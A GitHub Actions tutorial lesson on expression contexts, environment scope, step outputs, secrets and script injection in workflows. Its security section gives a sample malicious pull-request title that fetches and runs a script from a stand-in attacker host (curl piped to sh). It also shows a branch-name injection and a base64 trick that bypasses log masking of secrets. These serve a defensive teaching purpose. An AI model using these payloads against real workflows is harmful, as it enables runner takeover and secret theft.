# Lesson 05 — Contexts, variables, and secrets

**Workflow file:** [`.github/workflows/05-contexts-and-secrets.yml`](../.github/workflows/05-contexts-and-secrets.yml)

---

This is the longest lesson, and the one that turns Actions from "a script
runner" into "a programmable system." It also contains the security material,
so read section 6 even if you skim everything else.

---

## 1. What `${{ }}` actually does

```yaml
run: echo "Hello ${{ github.actor }}"
```

Here is the mechanism, and it explains a lot of otherwise-weird behaviour:

**GitHub performs textual substitution on the YAML file *before* the runner
executes anything.** By the time bash sees that line, it reads:

```bash
echo "Hello octocat"
```

The `${{ }}` is gone. It was never a shell feature. It's a templating pass
that happens first.

Two consequences:

- `${{ }}` works in places bash doesn't exist at all — in `if:`, in `name:`,
  in `runs-on:`, in a job's `needs:`.
- **Whatever is inside becomes part of your script.** Which is the entire
  security problem in section 6.

Compare with `$VAR`, which is ordinary bash and is evaluated by the shell at
runtime. Both appear in these workflows; they are not the same thing.

---

## 2. Environment variables and scope

Three levels. **Innermost wins.**

```yaml
env:
  SCOPE: workflow          # every step of every job

jobs:
  demo:
    env:
      SCOPE: job           # every step of this job
    steps:
      - env:
          SCOPE: step      # this step only
        run: echo $SCOPE   # -> "step"
```

Prefer the narrowest scope that works. A workflow-level `env:` that only one
step needs is a small mystery you're leaving for your future self.

---

## 3. The contexts

A context is a read-only object of information about the run.

| Context | Contains | Available where |
| --- | --- | --- |
| `github` | event payload, repo, ref, sha, actor | everywhere |
| `env` | your variables | everywhere except `env:` itself |
| `vars` | repo/org configuration variables | everywhere |
| `secrets` | encrypted values | not in `if:` at job/step level |
| `job` | current job's status and services | steps |
| `runner` | `os`, `arch`, `temp`, `tool_cache` | steps |
| `steps` | outputs of earlier steps | later steps, same job |
| `needs` | outputs/results of dependency jobs | jobs that `needs:` them |
| `matrix` | current matrix combination | matrix jobs |
| `inputs` | dispatch or workflow_call inputs | everywhere |

The fields you'll actually reach for:

```yaml
github.repository        # "octocat/hello-world"
github.ref_name          # "main"  (just the name)
github.ref               # "refs/heads/main"  (the full ref)
github.sha               # the full 40-char commit
github.actor             # who triggered it
github.event_name        # "push", "pull_request", ...
github.run_number        # increments per workflow — good for versioning
github.run_id            # unique per run — good for URLs
github.workspace         # where your code was checked out
```

### The debugging trick worth remembering

```yaml
- run: echo "$CTX"
  env:
    CTX: ${{ toJSON(github) }}
```

`toJSON()` is essential — interpolating an object directly gives you the
useless string `[object Object]`. Dump the context once, read it, and stop
guessing at field names.

---

## 4. Passing data between steps

Shell variables die with their step (Lesson 01). Two special files fix that.

### `$GITHUB_OUTPUT` — a named output

```yaml
- id: facts                                   # the id is what makes it referenceable
  run: echo "sha=${GITHUB_SHA:0:7}" >> "$GITHUB_OUTPUT"

- run: echo "${{ steps.facts.outputs.sha }}"
```

**Use `>>`, never `>`.** A single `>` truncates the file and destroys any
outputs written earlier in that step.

For multi-line values you need a heredoc delimiter, or the `key=value` format
breaks:

```yaml
- id: report
  run: |
    {
      echo 'body<<QOTD_EOF'
      echo 'line one'
      echo 'line two'
      echo 'QOTD_EOF'
    } >> "$GITHUB_OUTPUT"
```

Pick a delimiter that cannot appear in the content. If an attacker controls
the content and can guess your delimiter, they can inject arbitrary outputs —
which is why you'll see random-looking delimiters in production workflows.

### `$GITHUB_ENV` — an env var for later steps

```yaml
- run: echo "BUILD_TAG=v1.2.3" >> "$GITHUB_ENV"
- run: echo "$BUILD_TAG"        # works in this and all later steps
```

**Which one?** `GITHUB_OUTPUT` is explicit and scoped — you can see exactly
who produced a value and who consumes it. `GITHUB_ENV` is ambient and affects
everything downstream. Prefer outputs; reach for `GITHUB_ENV` when many
subsequent steps need the same value.

> Both of these replaced the old `::set-output::` and `::set-env::` workflow
> commands, which were **disabled for security reasons**. If you find a
> tutorial using `::set-output`, it predates 2022 — treat everything else in
> it with suspicion too.

---

## 5. Secrets and variables

Set both at **Settings → Secrets and variables → Actions**.

| | Secrets | Variables |
| --- | --- | --- |
| Storage | Encrypted | Plaintext |
| Readable after saving | **No** | Yes |
| Masked in logs | Yes | No |
| Use for | Tokens, keys, passwords | Region names, URLs, flags |
| Syntax | `${{ secrets.NAME }}` | `${{ vars.NAME }}` |

They exist at three levels — repository, environment, organisation — and the
most specific wins.

### `GITHUB_TOKEN`

Created automatically for every run. You don't make it, can't see it, and it
expires when the run ends. It's what lets a workflow comment on a PR or push
a commit. Lesson 10 covers its permission model.

### The rules

**1. Never echo a secret.** GitHub masks exact string matches in logs, but
that protection is shallow. It does not survive:
- base64 or any other encoding
- a secret that got split across lines
- printing a *substring* of it
- writing it to an artifact you then download

**2. Fork PRs get no secrets.** Deliberate, and correct. Otherwise anyone
could open a PR whose workflow prints your production keys.

**3. Pass secrets through `env:`, not into `run:` directly.** Which brings us
to the important part.

---

## 6. Script injection — the one security mistake to memorise

If you remember one thing from this entire course, make it this.

### The vulnerable code

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"
```

Looks harmless. It is not.

Remember section 1: `${{ }}` is substituted **before** bash runs. So if
someone opens a pull request titled:

```
hi"; curl -s https://evil.example/x.sh | sh; echo "
```

...your workflow executes:

```bash
echo "PR title: hi"; curl -s https://evil.example/x.sh | sh; echo ""
```

Their script now runs on your runner, with your workflow's token and any
secrets in the environment. **The attacker needed no access to your
repository whatsoever** — anyone can open a PR, and anyone can choose its
title.

### The fix

Route untrusted input through an environment variable:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

Now the value is *data*. Bash expands `$PR_TITLE` at runtime and never parses
its contents as code. The quotes matter too — always quote the expansion.

### What counts as untrusted

Anything a stranger can set:

- `github.event.pull_request.title` / `.body`
- `github.event.issue.title` / `.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.head_ref` — **yes, branch names**. `git checkout -b 'x";whoami;#'`
  is a legal branch name.
- commit messages and author names

Trusted-ish: `github.sha`, `github.repository`, `github.run_id` — these are
generated by GitHub, not typed by a person.

**The habit to build:** any time you're about to put `${{ github.event.* }}`
inside a `run:` block, stop and move it to `env:` instead. It costs two lines
and it closes the hole entirely.

---

## Run it

Push and trigger *05 - Contexts and Secrets* manually. Then:

1. Read the **Dump the whole github context** step. That's your reference
   for every field name you'll ever need.
2. Add a secret — Settings → Secrets and variables → Actions → New repository
   secret, named `DEMO_SECRET`, any value. Re-run. The workflow prints its
   *length* and then tries to print the value; watch GitHub replace it with
   `***`.
3. Add a variable named `DEMO_VARIABLE`. Re-run. It prints in full.

---

## Exercises

1. **Prove the masking is shallow.** With `DEMO_SECRET` set, add:
   ```yaml
   - env:
       S: ${{ secrets.DEMO_SECRET }}
     run: echo "$S" | base64
   ```
   The base64 output is **not** masked. Use a throwaway value. This is why
   "GitHub masks secrets" is not a security control you can lean on.

2. **Write the injection, safely.** In a scratch branch, create a workflow
   with the vulnerable `run: echo "${{ github.event.head_commit.message }}"`
   pattern. Then commit with the message:
   ```
   test"; echo PWNED; echo "
   ```
   Watch `PWNED` appear in your log. Then fix it with `env:` and confirm the
   message prints literally. Seeing it work is worth ten paragraphs of
   warning.

3. **Chain three steps** with `$GITHUB_OUTPUT`: step 1 counts the quotes,
   step 2 doubles it, step 3 prints both.

4. **Find the difference** between `github.ref` and `github.ref_name` by
   printing both on a branch, on `main`, and on a tag.

---

## Quiz

1. When is `${{ }}` evaluated — before or after the shell runs?
2. `>` or `>>` when writing to `$GITHUB_OUTPUT`?
3. Give three examples of untrusted input in a `github.event` payload.
4. Why is `echo "${{ github.event.issue.title }}"` dangerous?
5. Secret or variable: an AWS region name? A deploy key?

<details>
<summary>Answers</summary>

1. **Before.** It's textual substitution into the script, which is precisely
   why injection is possible.
2. **`>>`** (append). `>` truncates and destroys earlier outputs.
3. PR/issue titles and bodies, comment bodies, branch names (`head_ref`),
   commit messages, author names.
4. The title is substituted into the script text before bash parses it, so a
   title containing shell metacharacters becomes executable code.
5. Region → **variable** (not sensitive, useful to read). Deploy key →
   **secret**.

</details>

---

**Next:** [Lesson 06 — Matrix builds](06-matrix-builds.md)
